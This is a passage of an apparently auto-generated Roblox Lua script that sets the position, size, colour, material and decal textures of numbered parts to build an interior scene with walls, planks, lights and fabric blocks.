        Part193.CFrame = CFrame.new(11.9999952, 11856.6504, -6.14999294, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part193.Orientation = Vector3.new(0, -90, 0)
        Part193.Position = Vector3.new(11.999995231628418, 11856.650390625, -6.149992942810059)
        Part193.Rotation = Vector3.new(0, -90, 0)
        Part193.Color = Color3.new(0.992157, 0.917647, 0.552941)
        Part193.Size = Vector3.new(23.5, 1, 2.1999998092651367)
        Part193.Anchored = true
        Part193.BottomSurface = Enum.SurfaceType.Smooth
        Part193.BrickColor = BrickColor.new("Cool yellow")
        Part193.Material = Enum.Material.SmoothPlastic
        Part193.TopSurface = Enum.SurfaceType.Smooth
        Part193.brickColor = BrickColor.new("Cool yellow")
        Part194.Parent = Model0
        Part194.CFrame = CFrame.new(11.9999952, 11855.751, -6.19999599, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part194.Orientation = Vector3.new(0, -90, 0)
        Part194.Position = Vector3.new(11.999995231628418, 11855.7509765625, -6.199995994567871)
        Part194.Rotation = Vector3.new(0, -90, 0)
        Part194.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part194.Size = Vector3.new(23.399999618530273, 3.5999999046325684, 2)
        Part194.Anchored = true
        Part194.BottomSurface = Enum.SurfaceType.Smooth
        Part194.BrickColor = BrickColor.new("Really black")
        Part194.Material = Enum.Material.Wood
        Part194.TopSurface = Enum.SurfaceType.Smooth
        Part194.brickColor = BrickColor.new("Really black")
        Part195.Parent = Model0
        Part195.CFrame = CFrame.new(11.8999968, 11857.6006, -6.14999294, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part195.Orientation = Vector3.new(0, -90, 0)
        Part195.Position = Vector3.new(11.899996757507324, 11857.6005859375, -6.149992942810059)
        Part195.Rotation = Vector3.new(0, -90, 0)
        Part195.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part195.Size = Vector3.new(23.499998092651367, 0.09999996423721313, 2.200000047683716)
        Part195.Anchored = true
        Part195.BottomSurface = Enum.SurfaceType.Smooth
        Part195.BrickColor = BrickColor.new("Really black")
        Part195.Material = Enum.Material.SmoothPlastic
        Part195.TopSurface = Enum.SurfaceType.Smooth
        Part195.brickColor = BrickColor.new("Really black")
        Part196.Name = "Wood Plank"
        Part196.Parent = Model0
        Part196.CFrame = CFrame.new(-12.1000004, 11862.3506, -30.1999931, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part196.Orientation = Vector3.new(0, -90, 0)
        Part196.Position = Vector3.new(-12.100000381469727, 11862.3505859375, -30.199993133544922)
        Part196.Rotation = Vector3.new(0, -90, 0)
        Part196.Color = Color3.new(0.415686, 0.223529, 0.0352941)
        Part196.Size = Vector3.new(0.20000000298023224, 0.3999999761581421, 10)
        Part196.Anchored = true
        Part196.BottomSurface = Enum.SurfaceType.Smooth
        Part196.BrickColor = BrickColor.new("Burnt Sienna")
        Part196.Material = Enum.Material.Wood
        Part196.TopSurface = Enum.SurfaceType.Smooth
        Part196.brickColor = BrickColor.new("Burnt Sienna")
        Part197.Name = "Wood Plank"
        Part197.Parent = Model0
        Part197.CFrame = CFrame.new(-12.1000004, 11862.8506, -30.1999931, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part197.Orientation = Vector3.new(0, -90, 0)
        Part197.Position = Vector3.new(-12.100000381469727, 11862.8505859375, -30.199993133544922)
        Part197.Rotation = Vector3.new(0, -90, 0)
        Part197.Color = Color3.new(0.415686, 0.223529, 0.0352941)
        Part197.Size = Vector3.new(0.20000000298023224, 0.3999999761581421, 10)
        Part197.Anchored = true
        Part197.BottomSurface = Enum.SurfaceType.Smooth
        Part197.BrickColor = BrickColor.new("Burnt Sienna")
        Part197.Material = Enum.Material.Wood
        Part197.TopSurface = Enum.SurfaceType.Smooth
        Part197.brickColor = BrickColor.new("Burnt Sienna")
        Part198.Parent = Model0
        Part198.CFrame = CFrame.new(-14.4999981, 11870.6504, -15.9000006, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part198.Position = Vector3.new(-14.499998092651367, 11870.650390625, -15.90000057220459)
        Part198.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part198.Size = Vector3.new(0.19999989867210388, 1, 28)
        Part198.Anchored = true
        Part198.BottomSurface = Enum.SurfaceType.Smooth
        Part198.BrickColor = BrickColor.new("Dark stone grey")
        Part198.Material = Enum.Material.SmoothPlastic
        Part198.TopSurface = Enum.SurfaceType.Smooth
        Part198.brickColor = BrickColor.new("Dark stone grey")
        Part199.Parent = Model0
        Part199.CFrame = CFrame.new(-14.4499989, 11869.6504, -15.9000006, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part199.Position = Vector3.new(-14.44999885559082, 11869.650390625, -15.90000057220459)
        Part199.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part199.Size = Vector3.new(0.09999990463256836, 1, 28)
        Part199.Anchored = true
        Part199.BottomSurface = Enum.SurfaceType.Smooth
        Part199.BrickColor = BrickColor.new("Dark stone grey")
        Part199.Material = Enum.Material.SmoothPlastic
        Part199.TopSurface = Enum.SurfaceType.Smooth
        Part199.brickColor = BrickColor.new("Dark stone grey")
        Part200.Name = "Light"
        Part200.Parent = Model0
        Part200.CFrame = CFrame.new(-3.90000343, 11864.1504, -15.699996, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part200.Position = Vector3.new(-3.900003433227539, 11864.150390625, -15.699995994567871)
        Part200.Color = Color3.new(0.960784, 0.803922, 0.188235)
        Part200.Transparency = 1
        Part200.Size = Vector3.new(1, 1, 1)
        Part200.Anchored = true
        Part200.BottomSurface = Enum.SurfaceType.Smooth
        Part200.BrickColor = BrickColor.new("Bright yellow")
        Part200.Material = Enum.Material.ForceField
        Part200.TopSurface = Enum.SurfaceType.Smooth
        Part200.brickColor = BrickColor.new("Bright yellow")
        PointLight201.Parent = Part200
        PointLight201.Range = 20
        PointLight201.Shadows = true
        Part202.Name = "Light"
        Part202.Parent = Model0
        Part202.CFrame = CFrame.new(17.6999931, 11864.1504, -5.39999294, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part202.Position = Vector3.new(17.699993133544922, 11864.150390625, -5.399992942810059)
        Part202.Color = Color3.new(0.960784, 0.803922, 0.188235)
        Part202.Transparency = 1
        Part202.Size = Vector3.new(1, 1, 1)
        Part202.Anchored = true
        Part202.BottomSurface = Enum.SurfaceType.Smooth
        Part202.BrickColor = BrickColor.new("Bright yellow")
        Part202.Material = Enum.Material.ForceField
        Part202.TopSurface = Enum.SurfaceType.Smooth
        Part202.brickColor = BrickColor.new("Bright yellow")
        PointLight203.Parent = Part202
        PointLight203.Range = 20
        PointLight203.Shadows = true
        Part204.Parent = Model0
        Part204.CFrame = CFrame.new(11.9999933, 11861.251, -24.0499878, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part204.Position = Vector3.new(11.999993324279785, 11861.2509765625, -24.04998779296875)
        Part204.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part204.Size = Vector3.new(1.999999761581421, 7.199999809265137, 12.09999942779541)
        Part204.Anchored = true
        Part204.BottomSurface = Enum.SurfaceType.Smooth
        Part204.BrickColor = BrickColor.new("White")
        Part204.Material = Enum.Material.SmoothPlastic
        Part204.TopSurface = Enum.SurfaceType.Smooth
        Part204.brickColor = BrickColor.new("White")
        Part205.Parent = Model0
        Part205.CFrame = CFrame.new(11.9999981, 11855.7998, -23.9999847, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part205.Position = Vector3.new(11.999998092651367, 11855.7998046875, -23.999984741210938)
        Part205.Color = Color3.new(0.803922, 0.803922, 0.803922)
        Part205.Size = Vector3.new(2, 3.6999998092651367, 12.199999809265137)
        Part205.Anchored = true
        Part205.BottomSurface = Enum.SurfaceType.Smooth
        Part205.BrickColor = BrickColor.new("Mid gray")
        Part205.Material = Enum.Material.Cobblestone
        Part205.TopSurface = Enum.SurfaceType.Smooth
        Part205.brickColor = BrickColor.new("Mid gray")
        Part206.Parent = Model0
        Part206.CFrame = CFrame.new(4.64999485, 11861.2002, -30.1499901, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part206.Position = Vector3.new(4.649994850158691, 11861.2001953125, -30.14999008178711)
        Part206.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part206.Size = Vector3.new(23.5, 7.099999904632568, 0.10000000149011612)
        Part206.Anchored = true
        Part206.BottomSurface = Enum.SurfaceType.Smooth
        Part206.BrickColor = BrickColor.new("White")
        Part206.Material = Enum.Material.SmoothPlastic
        Part206.TopSurface = Enum.SurfaceType.Smooth
        Part206.brickColor = BrickColor.new("White")
        Part207.Parent = Model0
        Part207.CFrame = CFrame.new(-2.00000572, 11857.5498, -30.2999916, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part207.Orientation = Vector3.new(0, -90, 0)
        Part207.Position = Vector3.new(-2.0000057220458984, 11857.5498046875, -30.299991607666016)
        Part207.Rotation = Vector3.new(0, -90, 0)
        Part207.Color = Color3.new(0.929412, 0.917647, 0.917647)
        Part207.Size = Vector3.new(0.19999989867210388, 0.19999995827674866, 30)
        Part207.Anchored = true
        Part207.BottomSurface = Enum.SurfaceType.Smooth
        Part207.BrickColor = BrickColor.new("Lily white")
        Part207.Material = Enum.Material.Wood
        Part207.TopSurface = Enum.SurfaceType.Smooth
        Part207.brickColor = BrickColor.new("Lily white")
        Part208.Name = "Wood Plank"
        Part208.Parent = Model0
        Part208.CFrame = CFrame.new(-12.1000004, 11863.8506, -30.1999931, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part208.Orientation = Vector3.new(0, -90, 0)
        Part208.Position = Vector3.new(-12.100000381469727, 11863.8505859375, -30.199993133544922)
        Part208.Rotation = Vector3.new(0, -90, 0)
        Part208.Color = Color3.new(0.415686, 0.223529, 0.0352941)
        Part208.Size = Vector3.new(0.20000000298023224, 0.3999999761581421, 10)
        Part208.Anchored = true
        Part208.BottomSurface = Enum.SurfaceType.Smooth
        Part208.BrickColor = BrickColor.new("Burnt Sienna")
        Part208.Material = Enum.Material.Wood
        Part208.TopSurface = Enum.SurfaceType.Smooth
        Part208.brickColor = BrickColor.new("Burnt Sienna")
        Part209.Name = "Wood Plank"
        Part209.Parent = Model0
        Part209.CFrame = CFrame.new(-12.1000004, 11863.3506, -30.1999931, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part209.Orientation = Vector3.new(0, -90, 0)
        Part209.Position = Vector3.new(-12.100000381469727, 11863.3505859375, -30.199993133544922)
        Part209.Rotation = Vector3.new(0, -90, 0)
        Part209.Color = Color3.new(0.415686, 0.223529, 0.0352941)
        Part209.Size = Vector3.new(0.20000000298023224, 0.3999999761581421, 10)
        Part209.Anchored = true
        Part209.BottomSurface = Enum.SurfaceType.Smooth
        Part209.BrickColor = BrickColor.new("Burnt Sienna")
        Part209.Material = Enum.Material.Wood
        Part209.TopSurface = Enum.SurfaceType.Smooth
        Part209.brickColor = BrickColor.new("Burnt Sienna")
        Part210.Name = "Wood Plank"
        Part210.Parent = Model0
        Part210.CFrame = CFrame.new(-12.1000004, 11864.3506, -30.1999931, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part210.Orientation = Vector3.new(0, -90, 0)
        Part210.Position = Vector3.new(-12.100000381469727, 11864.3505859375, -30.199993133544922)
        Part210.Rotation = Vector3.new(0, -90, 0)
        Part210.Color = Color3.new(0.415686, 0.223529, 0.0352941)
        Part210.Size = Vector3.new(0.20000000298023224, 0.3999999761581421, 10)
        Part210.Anchored = true
        Part210.BottomSurface = Enum.SurfaceType.Smooth
        Part210.BrickColor = BrickColor.new("Burnt Sienna")
        Part210.Material = Enum.Material.Wood
        Part210.TopSurface = Enum.SurfaceType.Smooth
        Part210.brickColor = BrickColor.new("Burnt Sienna")
        Part211.Parent = Model0
        Part211.CFrame = CFrame.new(17.9999962, 11855.7998, -30.1499901, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part211.Position = Vector3.new(17.999996185302734, 11855.7998046875, -30.14999008178711)
        Part211.Color = Color3.new(0.803922, 0.803922, 0.803922)
        Part211.Size = Vector3.new(70, 3.6999998092651367, 0.10000000149011612)
        Part211.Anchored = true
        Part211.BottomSurface = Enum.SurfaceType.Smooth
        Part211.BrickColor = BrickColor.new("Mid gray")
        Part211.Material = Enum.Material.Cobblestone
        Part211.TopSurface = Enum.SurfaceType.Smooth
        Part211.brickColor = BrickColor.new("Mid gray")
        Part212.Parent = Model0
        Part212.CFrame = CFrame.new(19.3000031, 11855.751, -29.0499878, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part212.Position = Vector3.new(19.300003051757812, 11855.7509765625, -29.04998779296875)
        Part212.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part212.Size = Vector3.new(12.800000190734863, 3.5999999046325684, 2.0999999046325684)
        Part212.Anchored = true
        Part212.BottomSurface = Enum.SurfaceType.Smooth
        Part212.BrickColor = BrickColor.new("Really black")
        Part212.Material = Enum.Material.Wood
        Part212.TopSurface = Enum.SurfaceType.Smooth
        Part212.brickColor = BrickColor.new("Really black")
        Part213.Parent = Model0
        Part213.CFrame = CFrame.new(19.2999973, 11856.6504, -29, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part213.Position = Vector3.new(19.299997329711914, 11856.650390625, -29)
        Part213.Color = Color3.new(0.992157, 0.917647, 0.552941)
        Part213.Size = Vector3.new(12.800000190734863, 1, 2.1999998092651367)
        Part213.Anchored = true
        Part213.BottomSurface = Enum.SurfaceType.Smooth
        Part213.BrickColor = BrickColor.new("Cool yellow")
        Part213.Material = Enum.Material.SmoothPlastic
        Part213.TopSurface = Enum.SurfaceType.Smooth
        Part213.brickColor = BrickColor.new("Cool yellow")
        Part214.Parent = Model0
        Part214.CFrame = CFrame.new(19.3499928, 11857.6006, -29, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part214.Position = Vector3.new(19.349992752075195, 11857.6005859375, -29)
        Part214.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part214.Size = Vector3.new(12.699999809265137, 0.09999996423721313, 2.200000047683716)
        Part214.Anchored = true
        Part214.BottomSurface = Enum.SurfaceType.Smooth
        Part214.BrickColor = BrickColor.new("Really black")
        Part214.Material = Enum.Material.SmoothPlastic
        Part214.TopSurface = Enum.SurfaceType.Smooth
        Part214.brickColor = BrickColor.new("Really black")
        Part215.Parent = Model0
        Part215.CFrame = CFrame.new(18.9499931, 11857.751, -30.1499901, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part215.Position = Vector3.new(18.949993133544922, 11857.7509765625, -30.14999008178711)
        Part215.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part215.Size = Vector3.new(5.099998474121094, 0.19999942183494568, 0.10000000149011612)
        Part215.Anchored = true
        Part215.BottomSurface = Enum.SurfaceType.Smooth
        Part215.BrickColor = BrickColor.new("White")
        Part215.Material = Enum.Material.SmoothPlastic
        Part215.TopSurface = Enum.SurfaceType.Smooth
        Part215.brickColor = BrickColor.new("White")
        Part216.Parent = Model0
        Part216.CFrame = CFrame.new(18.9499893, 11857.9004, -30.1499977, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part216.Position = Vector3.new(18.949989318847656, 11857.900390625, -30.14999771118164)
        Part216.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part216.Size = Vector3.new(4.899999618530273, 0.09999996423721313, 0.09999989718198776)
        Part216.Anchored = true
        Part216.BottomSurface = Enum.SurfaceType.Smooth
        Part216.BrickColor = BrickColor.new("Really black")
        Part216.Material = Enum.Material.SmoothPlastic
        Part216.TopSurface = Enum.SurfaceType.Smooth
        Part216.brickColor = BrickColor.new("Really black")
        Part217.Parent = Model0
        Part217.CFrame = CFrame.new(32.9499931, 11855.7998, 13.0500069, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part217.Position = Vector3.new(32.94999313354492, 11855.7998046875, 13.050006866455078)
        Part217.Color = Color3.new(0.803922, 0.803922, 0.803922)
        Part217.Size = Vector3.new(39.900001525878906, 3.6999998092651367, 0.09999895095825195)
        Part217.Anchored = true
        Part217.BottomSurface = Enum.SurfaceType.Smooth
        Part217.BrickColor = BrickColor.new("Mid gray")
        Part217.Material = Enum.Material.Cobblestone
        Part217.TopSurface = Enum.SurfaceType.Smooth
        Part217.brickColor = BrickColor.new("Mid gray")
        Part218.Parent = Model0
        Part218.CFrame = CFrame.new(21.4499931, 11855.7998, -2.44999409, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part218.Position = Vector3.new(21.449993133544922, 11855.7998046875, -2.4499940872192383)
        Part218.Color = Color3.new(0.803922, 0.803922, 0.803922)
        Part218.Size = Vector3.new(0.09999990463256836, 3.6999998092651367, 30.899999618530273)
        Part218.Anchored = true
        Part218.BottomSurface = Enum.SurfaceType.Smooth
        Part218.BrickColor = BrickColor.new("Mid gray")
        Part218.Material = Enum.Material.Cobblestone
        Part218.TopSurface = Enum.SurfaceType.Smooth
        Part218.brickColor = BrickColor.new("Mid gray")
        Part219.Parent = Model0
        Part219.CFrame = CFrame.new(23.1999931, 11855.665, 9.21000671, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part219.Orientation = Vector3.new(0, -90, 0)
        Part219.Position = Vector3.new(23.199993133544922, 11855.6650390625, 9.210006713867188)
        Part219.Rotation = Vector3.new(0, -90, 0)
        Part219.Size = Vector3.new(7.579999923706055, 3.4300003051757812, 3.4000003337860107)
        Part219.Anchored = true
        Part219.BottomSurface = Enum.SurfaceType.Smooth
        Part219.Material = Enum.Material.Fabric
        Part219.TopSurface = Enum.SurfaceType.Smooth
        Decal220.Parent = Part219
        Decal220.Texture = "http://www.roblox.com/asset/?id=62967748"
        Decal221.Parent = Part219
        Decal221.Texture = "http://www.roblox.com/asset/?id=62967724"
        Decal221.Face = Enum.NormalId.Back
        Decal222.Parent = Part219
        Decal222.Texture = "http://www.roblox.com/asset/?id=3164651356"
        Decal222.Face = Enum.NormalId.Left
        Decal223.Parent = Part219
        Decal223.Texture = "http://www.roblox.com/asset/?id=3164651356"
        Decal223.Face = Enum.NormalId.Right
        Decal224.Parent = Part219
        Decal224.Texture = "http://www.roblox.com/asset/?id=151807783"
        Decal224.Face = Enum.NormalId.Bottom
        Decal225.Parent = Part219
        Decal225.Texture = "http://www.roblox.com/asset/?id=151807783"
        Decal225.Face = Enum.NormalId.Top
        Part226.Parent = Model0
        Part226.CFrame = CFrame.new(23.1999931, 11859.4658, 9.21000671, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part226.Orientation = Vector3.new(0, -90, 0)
        Part226.Position = Vector3.new(23.199993133544922, 11859.4658203125, 9.210006713867188)
        Part226.Rotation = Vector3.new(0, -90, 0)
        Part226.Size = Vector3.new(7.579999923706055, 3.4300003051757812, 3.4000003337860107)
        Part226.Anchored = true
        Part226.BottomSurface = Enum.SurfaceType.Smooth
        Part226.Material = Enum.Material.Fabric
        Part226.TopSurface = Enum.SurfaceType.Smooth
        Decal227.Parent = Part226
        Decal227.Texture = "http://www.roblox.com/asset/?id=62967748"
        Decal228.Parent = Part226
        Decal228.Texture = "http://www.roblox.com/asset/?id=62967724"
        Decal228.Face = Enum.NormalId.Back
        Decal229.Parent = Part226
        Decal229.Texture = "http://www.roblox.com/asset/?id=3164651356"
        Decal229.Face = Enum.NormalId.Left
        Decal230.Parent = Part226
        Decal230.Texture = "http://www.roblox.com/asset/?id=3164651356"
        Decal230.Face = Enum.NormalId.Right
        Decal231.Parent = Part226
        Decal231.Texture = "http://www.roblox.com/asset/?id=151807783"
        Decal231.Face = Enum.NormalId.Bottom
        Decal232.Parent = Part226
        Decal232.Texture = "http://www.roblox.com/asset/?id=151807783"
        Decal232.Face = Enum.NormalId.Top
        Part233.Parent = Model0
        Part233.CFrame = CFrame.new(23.1999931, 11859.4658, 1.21000719, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part233.Orientation = Vector3.new(0, -90, 0)
        Part233.Position = Vector3.new(23.199993133544922, 11859.4658203125, 1.2100071907043457)
        Part233.Rotation = Vector3.new(0, -90, 0)
        Part233.Size = Vector3.new(7.579999923706055, 3.4300003051757812, 3.4000003337860107)
        Part233.Anchored = true
        Part233.BottomSurface = Enum.SurfaceType.Smooth
        Part233.Material = Enum.Material.Fabric
        Part233.TopSurface = Enum.SurfaceType.Smooth
        Decal234.Parent = Part233
        Decal234.Texture = "http://www.roblox.com/asset/?id=62967748"
        Decal235.Parent = Part233
        Decal235.Texture = "http://www.roblox.com/asset/?id=62967724"
        Decal235.Face = Enum.NormalId.Back
        Decal236.Parent = Part233
        Decal236.Texture = "http://www.roblox.com/asset/?id=3164651356"
        Decal236.Face = Enum.NormalId.Left
        Decal237.Parent = Part233
        Decal237.Texture = "http://www.roblox.com/asset/?id=3164651356"
        Decal237.Face = Enum.NormalId.Right
        Decal238.Parent = Part233
        Decal238.Texture = "http://www.roblox.com/asset/?id=151807783"
        Decal238.Face = Enum.NormalId.Bottom
        Decal239.Parent = Part233
        Decal239.Texture = "http://www.roblox.com/asset/?id=151807783"
        Decal239.Face = Enum.NormalId.Top
        Part240.Parent = Model0
        Part240.CFrame = CFrame.new(23.1999931, 11855.665, 1.21000719, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part240.Orientation = Vector3.new(0, -90, 0)
        Part240.Position = Vector3.new(23.199993133544922, 11855.6650390625, 1.2100071907043457)
        Part240.Rotation = Vector3.new(0, -90, 0)
        Part240.Size = Vector3.new(7.579999923706055, 3.4300003051757812, 3.4000003337860107)
        Part240.Anchored = true
        Part240.BottomSurface = Enum.SurfaceType.Smooth
        Part240.Material = Enum.Material.Fabric
        Part240.TopSurface = Enum.SurfaceType.Smooth
        Decal241.Parent = Part240
        Decal241.Texture = "http://www.roblox.com/asset/?id=62967748"
        Decal242.Parent = Part240
        Decal242.Texture = "http://www.roblox.com/asset/?id=62967724"
        Decal242.Face = Enum.NormalId.Back
        Decal243.Parent = Part240
        Decal243.Texture = "http://www.roblox.com/asset/?id=3164651356"
        Decal243.Face = Enum.NormalId.Left
        Decal244.Parent = Part240
        Decal244.Texture = "http://www.roblox.com/asset/?id=3164651356"
        Decal244.Face = Enum.NormalId.Right
        Decal245.Parent = Part240
        Decal245.Texture = "http://www.roblox.com/asset/?id=151807783"
        Decal245.Face = Enum.NormalId.Bottom
        Decal246.Parent = Part240
        Decal246.Texture = "http://www.roblox.com/asset/?id=151807783"
        Decal246.Face = Enum.NormalId.Top
        Part247.Parent = Model0
        Part247.CFrame = CFrame.new(23.1999931, 11855.665, -6.68999243, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part247.Orientation = Vector3.new(0, -90, 0)
        Part247.Position = Vector3.new(23.199993133544922, 11855.6650390625, -6.689992427825928)
        Part247.Rotation = Vector3.new(0, -90, 0)
        Part247.Size = Vector3.new(7.579999923706055, 3.4300003051757812, 3.4000003337860107)
        Part247.Anchored = true
        Part247.BottomSurface = Enum.SurfaceType.Smooth
        Part247.Material = Enum.Material.Fabric
        Part247.TopSurface = Enum.SurfaceType.Smooth
        Decal248.Parent = Part247
        Decal248.Texture = "http://www.roblox.com/asset/?id=62967748"
        Decal249.Parent = Part247
        Decal249.Texture = "http://www.roblox.com/asset/?id=62967724"
        Decal249.Face = Enum.NormalId.Back
        Decal250.Parent = Part247
        Decal250.Texture = "http://www.roblox.com/asset/?id=3164651356"
        Decal250.Face = Enum.NormalId.Left
        Decal251.Parent = Part247
        Decal251.Texture = "http://www.roblox.com/asset/?id=3164651356"
        Decal251.Face = Enum.NormalId.Right
        Decal252.Parent = Part247
        Decal252.Texture = "http://www.roblox.com/asset/?id=151807783"
        Decal252.Face = Enum.NormalId.Bottom
        Decal253.Parent = Part247
        Decal253.Texture = "http://www.roblox.com/asset/?id=151807783"
        Decal253.Face = Enum.NormalId.Top
        Part254.Parent = Model0
        Part254.CFrame = CFrame.new(23.1999931, 11859.4658, -6.68999243, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part254.Orientation = Vector3.new(0, -90, 0)
        Part254.Position = Vector3.new(23.199993133544922, 11859.4658203125, -6.689992427825928)
        Part254.Rotation = Vector3.new(0, -90, 0)
        Part254.Size = Vector3.new(7.579999923706055, 3.4300003051757812, 3.4000003337860107)
        Part254.Anchored = true
        Part254.BottomSurface = Enum.SurfaceType.Smooth
        Part254.Material = Enum.Material.Fabric
        Part254.TopSurface = Enum.SurfaceType.Smooth
        Decal255.Parent = Part254
        Decal255.Texture = "http://www.roblox.com/asset/?id=62967748"
        Decal256.Parent = Part254
        Decal256.Texture = "http://www.roblox.com/asset/?id=62967724"
        Decal256.Face = Enum.NormalId.Back
        Decal257.Parent = Part254
        Decal257.Texture = "http://www.roblox.com/asset/?id=3164651356"
        Decal257.Face = Enum.NormalId.Left
        Decal258.Parent = Part254
        Decal258.Texture = "http://www.roblox.com/asset/?id=3164651356"
        Decal258.Face = Enum.NormalId.Right
        Decal259.Parent = Part254
        Decal259.Texture = "http://www.roblox.com/asset/?id=151807783"
        Decal259.Face = Enum.NormalId.Bottom
        Decal260.Parent = Part254
        Decal260.Texture = "http://www.roblox.com/asset/?id=151807783"
        Decal260.Face = Enum.NormalId.Top
        Model261.Parent = Model0
        Part262.Parent = Model261
        Part262.CFrame = CFrame.new(-15.71667, 11858.4004, -27.099987, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part262.Orientation = Vector3.new(0, -90, 0)
        Part262.Position = Vector3.new(-15.716670036315918, 11858.400390625, -27.099987030029297)
        Part262.Rotation = Vector3.new(0, -90, 0)
        Part262.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part262.Size = Vector3.new(0.3999999165534973, 0.10000000149011612, 0.19999995827674866)
        Part262.Anchored = true
        Part262.BottomSurface = Enum.SurfaceType.Smooth
        Part262.BrickColor = BrickColor.new("Really black")
        Part262.Material = Enum.Material.SmoothPlastic
        Part262.TopSurface = Enum.SurfaceType.Smooth
        Part262.brickColor = BrickColor.new("Really black")
        UnionOperation263.Parent = Model261
        UnionOperation263.CFrame = CFrame.new(-15.7916555, 11858.3115, -27.0999966, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        UnionOperation263.Orientation = Vector3.new(0, -90, 0)
        UnionOperation263.Position = Vector3.new(-15.791655540466309, 11858.3115234375, -27.09999656677246)
        UnionOperation263.Rotation = Vector3.new(0, -90, 0)
        UnionOperation263.Color = Color3.new(0.623529, 0.631373, 0.67451)
        UnionOperation263.Size = Vector3.new(0.4000091552734375, 1.0789999961853027, 0.250030517578125)
        UnionOperation263.Anchored = true
        UnionOperation263.BrickColor = BrickColor.new("Fossil")
        UnionOperation263.Material = Enum.Material.Metal
        UnionOperation263.brickColor = BrickColor.new("Fossil")
        Part264.Parent = Model261
        Part264.CFrame = CFrame.new(-15.71667, 11858.7998, -27.099987, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part264.Orientation = Vector3.new(0, -90, 0)
        Part264.Position = Vector3.new(-15.716670036315918, 11858.7998046875, -27.099987030029297)
        Part264.Rotation = Vector3.new(0, -90, 0)
        Part264.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part264.Size = Vector3.new(0.5999999046325684, 0.699999988079071, 0.3999999463558197)
        Part264.Anchored = true
        Part264.BottomSurface = Enum.SurfaceType.Smooth
        Part264.BrickColor = BrickColor.new("Dark stone grey")
        Part264.Material = Enum.Material.SmoothPlastic
        Part264.TopSurface = Enum.SurfaceType.Smooth
        Part264.brickColor = BrickColor.new("Dark stone grey")
        Decal265.Parent = Part264
        Decal265.Texture = "http://www.roblox.com/asset/?id=5409902"
        Part266.Parent = Model261
        Part266.CFrame = CFrame.new(-15.71667, 11859.1006, -27.099987, 0, 0, -1, 1, 0, 0, 0, -1, 0)
        Part266.Orientation = Vector3.new(0, -90, 90)
        Part266.Position = Vector3.new(-15.716670036315918, 11859.1005859375, -27.099987030029297)
        Part266.Rotation = Vector3.new(-90, -90, 0)
        Part266.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part266.Size = Vector3.new(0.699999988079071, 0.19999995827674866, 0.19999995827674866)
        Part266.Anchored = true
        Part266.BottomSurface = Enum.SurfaceType.Smooth
        Part266.BrickColor = BrickColor.new("Really black")
        Part266.Material = Enum.Material.SmoothPlastic
        Part266.TopSurface = Enum.SurfaceType.Smooth
        Part266.brickColor = BrickColor.new("Really black")
        Part266.Shape = Enum.PartType.Cylinder
        Part267.Parent = Model261
        Part267.CFrame = CFrame.new(-15.71667, 11859.1006, -26.1999855, 0, 0, -1, 1, 0, 0, 0, -1, 0)
        Part267.Orientation = Vector3.new(0, -90, 90)
        Part267.Position = Vector3.new(-15.716670036315918, 11859.1005859375, -26.19998550415039)
        Part267.Rotation = Vector3.new(-90, -90, 0)
        Part267.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part267.Size = Vector3.new(0.699999988079071, 0.19999995827674866, 0.19999995827674866)
        Part267.Anchored = true
        Part267.BottomSurface = Enum.SurfaceType.Smooth
        Part267.BrickColor = BrickColor.new("Really black")
        Part267.Material = Enum.Material.SmoothPlastic
        Part267.TopSurface = Enum.SurfaceType.Smooth
        Part267.brickColor = BrickColor.new("Really black")
        Part267.Shape = Enum.PartType.Cylinder
        Part268.Parent = Model261
        Part268.CFrame = CFrame.new(-15.71667, 11858.7998, -26.1999855, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part268.Orientation = Vector3.new(0, -90, 0)
        Part268.Position = Vector3.new(-15.716670036315918, 11858.7998046875, -26.19998550415039)
        Part268.Rotation = Vector3.new(0, -90, 0)
        Part268.Color = Color3.new(0.388235, 0.372549, 0.384314)
